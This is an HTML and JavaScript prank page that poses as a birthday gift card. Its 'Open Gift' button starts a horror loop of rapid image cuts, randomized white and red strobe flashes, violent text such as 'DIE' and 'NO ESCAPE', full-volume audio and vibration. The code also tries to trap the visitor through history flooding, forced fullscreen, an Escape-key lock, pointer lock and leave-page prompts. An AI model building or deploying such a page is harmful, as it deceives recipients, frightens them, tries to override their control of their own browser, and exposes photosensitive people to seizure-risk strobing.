<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <title>Happy Birthday! ðŸŽ‚</title>
    <style>
        /* --- GLOBAL RESET --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            cursor: none; /* Hide cursor globally */
        }

        html, body {
            overflow: hidden;
            height: 100%;
            width: 100%;
            background: #000;
            /* DEFENSE: Kills pull-to-refresh and browser swipe-back */
            touch-action: none; 
            overscroll-behavior: none;
            position: fixed; 
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
        }

        /* =========================================
           LAYER 1: THE INNOCENT "BAIT" UI 
           ========================================= */
        #innocent-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(at top left, #a8c0ff, transparent),
                        radial-gradient(at bottom right, #3f2b96, transparent),
                        linear-gradient(to bottom right, #ff9a9e, #fad0c4);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 0.2s ease-out;
            cursor: default; /* Show cursor only here */
        }

        .orb {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.8;
            z-index: 101;
            animation: floatOrb 10s infinite ease-in-out;
        }

        .orb-1 { width: 300px; height: 300px; background: #8ec5fc; top: -50px; left: -50px; }
        .orb-2 { width: 400px; height: 400px; background: #e0c3fc; bottom: -100px; right: -100px; animation-delay: -5s; }

        @keyframes floatOrb {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(1.1); }
        }

        .card {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 50px 40px;
            border-radius: 30px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            text-align: center;
            max-width: 90%;
            width: 450px;
            position: relative;
            z-index: 102;
        }

        .card h1 {
            color: #fff;
            font-size: 3rem;
            margin-bottom: 15px;
            font-weight: 700;
            text-shadow: 0 4px 10px rgba(0,0,0,0.1);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        .card p {
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 40px;
            font-size: 1.2rem;
            line-height: 1.6;
            font-weight: 500;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        .btn-surprise {
            background: rgba(255, 255, 255, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.5);
            color: #fff;
            padding: 18px 45px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            backdrop-filter: blur(5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            transition: all 0.3s;
            outline: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        .btn-surprise:hover { transform: translateY(-3px); background: rgba(255, 255, 255, 0.5); }
        .btn-surprise:active { transform: scale(0.95); }
        .btn-surprise:disabled { opacity: 0.6; cursor: not-allowed; }

        .loading-text {
            margin-top: 20px;
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.7);
            opacity: 0;
            transition: opacity 0.3s;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: #fff;
            animation: fall linear forwards;
            z-index: 101;
            opacity: 0.8;
        }

        @keyframes fall { to { transform: translateY(100vh) rotate(720deg); } }

        /* =========================================
           LAYER 2: NIGHTMARE ENGINE
           ========================================= */
        #chaos-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100dvh; 
            background: #000;
            z-index: 1;
            display: none;
            /* This allows us to invert/corrupt the whole screen */
            will-change: filter, transform;
        }

        /* ANALOG NOISE OVERLAY */
        #noise-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 8;
            opacity: 0.15;
            pointer-events: none;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
            display: none;
        }

        /* DARK VIGNETTE */
        #vignette {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            box-shadow: inset 0 0 150px rgba(0,0,0,0.9);
            z-index: 7;
            pointer-events: none;
            display: none;
        }

        .loop-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        
        .loop-img.active { 
            display: block; 
            /* Subtle zoom breathing to make it feel alive */
            animation: pulse-terror 0.1s infinite alternate;
        }

        @keyframes pulse-terror {
            from { transform: scale(1.0); }
            to { transform: scale(1.05); }
        }

        /* FLASH LAYER */
        #flash-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 10;
            opacity: 0;
            pointer-events: none;
        }

        /* BLOOD TEXT LAYER */
        #glitch-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: 'Impact', 'Arial Black', sans-serif; 
            font-weight: 900;
            text-transform: uppercase;
            z-index: 20;
            pointer-events: none;
            display: none;
            white-space: nowrap;
            color: #8a0303; 
            text-shadow: 4px 4px 0px #000;
            mix-blend-mode: exclusion; /* Makes text look "burnt" into image */
        }

        /* Anti-Escape Overlay */
        #trap-net {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            display: none;
        }

    </style>
</head>
<body>

    <audio id="bg-audio" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <!-- INNOCENT UI -->
    <div id="innocent-layer">
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        <div class="card">
            <h1>Surprise! ðŸŽ‰</h1>
            <p>I've prepared a special digital gift for you.<br>I think, You would love itðŸ‘‰ðŸ‘ˆ</p>
            <button class="btn-surprise" id="trigger-btn" disabled>Loading Gift...</button>
            <div class="loading-text" id="load-status">Decrypting assets...</div>
        </div>
    </div>

    <!-- HORROR UI -->
    <div id="chaos-layer"></div>
    <div id="noise-layer"></div>
    <div id="vignette"></div>
    <div id="flash-layer"></div>
    <div id="glitch-text"></div>
    <div id="trap-net"></div>

    <script>
        // CONFIGURATION
        const CONFIG = {
            imageCount: 15,          
            fileExt: '.jpg'
        };

        const CREEPY_WORDS = ["I SEE YOU", "RUN", "HELP", "DIE", "BEHIND YOU", "666", "ERROR", "NO ESCAPE", "WAKE UP", "IT HURTS", "DON'T LOOK"];
        const BLOOD_COLORS = ['#ff0000', '#cc0000', '#8a0303', '#4d0000'];

        // ELEMENTS
        const innocentLayer = document.getElementById('innocent-layer');
        const chaosLayer = document.getElementById('chaos-layer');
        const flashLayer = document.getElementById('flash-layer');
        const glitchText = document.getElementById('glitch-text');
        const triggerBtn = document.getElementById('trigger-btn');
        const loadStatus = document.getElementById('load-status');
        const chaosContainer = document.getElementById('chaos-layer');
        const audio = document.getElementById('bg-audio');
        const noiseLayer = document.getElementById('noise-layer');
        const vignette = document.getElementById('vignette');
        const trapNet = document.getElementById('trap-net');

        let images = [];
        let loaded = 0;
        let activeIndex = 0;
        let isPrankActive = false;

        function preloadImages() {
            loadStatus.style.opacity = '1';
            for(let i=1; i <= CONFIG.imageCount; i++) {
                const img = new Image();
                img.src = `${i}${CONFIG.fileExt}`;
                img.className = 'loop-img';
                img.loading = "eager";
                img.onload = () => { loaded++; checkLoad(); };
                img.onerror = () => { loaded++; checkLoad(); };
                images.push(img);
                chaosContainer.appendChild(img);
            }
        }

        function checkLoad() {
            if(loaded >= CONFIG.imageCount) {
                triggerBtn.disabled = false;
                triggerBtn.textContent = "Open Gift ðŸŽ";
                loadStatus.style.opacity = '0';
            }
        }

        triggerBtn.addEventListener('click', () => {
            isPrankActive = true;
            innocentLayer.style.display = 'none';
            chaosLayer.style.display = 'block';
            noiseLayer.style.display = 'block';
            vignette.style.display = 'block';
            trapNet.style.display = 'block';
            glitchText.style.display = 'block';

            // TRAP: FLOOD HISTORY
            try {
                history.pushState(null, document.title, location.href);
                window.addEventListener('popstate', function (event) {
                    history.pushState(null, document.title, location.href);
                });
            } catch(e) {}

            forceFullscreen();
            audio.volume = 1.0;
            audio.play();
            
            // Start the non-linear horror loop
            nightmareLoop();
        });

        function nightmareLoop() {
            if(!isPrankActive) return;

            // 1. Advance Image
            images[activeIndex].classList.remove('active');
            
            // Random jump logic: Sometimes skip images to look glitchy
            if(Math.random() > 0.8) {
                activeIndex = Math.floor(Math.random() * images.length);
            } else {
                activeIndex++;
                if(activeIndex >= images.length) activeIndex = 0;
            }
            images[activeIndex].classList.add('active');

            // 2. Visual Corruption (Randomly apply CSS filters)
            const chaosRoll = Math.random();
            if (chaosRoll > 0.9) {
                // Invert Colors
                chaosLayer.style.filter = "invert(100%) contrast(150%)";
            } else if (chaosRoll > 0.8) {
                // Deep Red Saturation
                chaosLayer.style.filter = "sepia(100%) saturate(500%) hue-rotate(-50deg)";
            } else if (chaosRoll > 0.7) {
                // Blur shock
                chaosLayer.style.filter = "blur(5px)";
            } else {
                // Normal
                chaosLayer.style.filter = "contrast(120%) brightness(110%)";
            }

            // 3. Strobe Flash (Randomized)
            if (Math.random() > 0.7) {
                flashLayer.style.opacity = Math.random() * 0.5; // Flicker
                flashLayer.style.background = Math.random() > 0.8 ? "red" : "white";
            } else {
                flashLayer.style.opacity = 0;
            }

            // 4. Glitch Text (Random words, sizes, positions)
            if (Math.random() > 0.5) {
                glitchText.style.display = 'block';
                glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
                glitchText.style.fontSize = (Math.random() * 6 + 2) + 'rem';
                glitchText.style.color = BLOOD_COLORS[Math.floor(Math.random() * BLOOD_COLORS.length)];
                
                // Jitter position
                const randX = 50 + (Math.random() * 20 - 10);
                const randY = 50 + (Math.random() * 20 - 10);
                glitchText.style.left = randX + '%';
                glitchText.style.top = randY + '%';
                
                // Rotation
                glitchText.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 20 - 10}deg)`;
            } else {
                glitchText.style.display = 'none';
            }

            // 5. Vibration (Mobile)
            if (navigator.vibrate && Math.random() > 0.5) navigator.vibrate(50);

            // 6. VARIABLE SPEED (The "Kexart" feel)
            // Sometimes it's super fast (30ms), sometimes it pauses (150ms)
            const nextFrameTime = Math.random() > 0.9 ? 150 : (30 + Math.random() * 40);

            setTimeout(nightmareLoop, nextFrameTime);
        }

        async function forceFullscreen() {
            const doc = document.documentElement;
            try {
                if (doc.requestFullscreen) await doc.requestFullscreen();
                else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
            } catch(e) {}
            
            try {
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(['Escape']);
                }
            } catch(e) {}
            
            try { document.body.requestPointerLock(); } catch(e) {}
        }

        // --- SELF-HEALING / READJUSTMENT LOGIC ---
        function handleBreach() {
            if (!isPrankActive) return;
            
            // Punishment for resizing/escaping
            flashLayer.style.background = "red";
            flashLayer.style.opacity = "0.8";
            
            glitchText.innerText = "NO ESCAPE";
            glitchText.style.fontSize = "6rem";
            glitchText.style.display = "block";
            
            window.scrollTo(0, 0);
            forceFullscreen();
            
            setTimeout(() => { flashLayer.style.opacity = "0"; }, 100);
        }

        window.addEventListener('resize', handleBreach);
        if (window.visualViewport) window.visualViewport.addEventListener('resize', handleBreach);

        // Prevent Scroll/Touch Navigation
        document.body.addEventListener('touchmove', function(e) {
            if(isPrankActive) e.preventDefault();
        }, { passive: false });

        // General Trap Listeners
        ['click', 'mousemove', 'mousedown', 'touchstart', 'keydown', 'focus'].forEach(evt => {
            window.addEventListener(evt, () => {
                if(isPrankActive && !document.fullscreenElement) {
                    forceFullscreen();
                }
            });
        });

        // Ensure Audio Loops
        audio.addEventListener('ended', function() {
            this.currentTime = 0;
            this.play();
        }, false);

        window.onbeforeunload = function() {
            if(isPrankActive) return "Are you sure you want to leave?";
        };

        function createConfetti() {
            const colors = ['#fff', '#f0f', '#0ff', '#ff0'];
            const conf = document.createElement('div');
            conf.className = 'confetti';
            conf.style.left = Math.random() * 100 + 'vw';
            conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            conf.style.animationDuration = (Math.random() * 3 + 2) + 's';
            innocentLayer.appendChild(conf);
            setTimeout(() => conf.remove(), 5000);
        }
        setInterval(createConfetti, 300);

        preloadImages();
        document.addEventListener('contextmenu', event => event.preventDefault());

    </script>
</body>
</html>
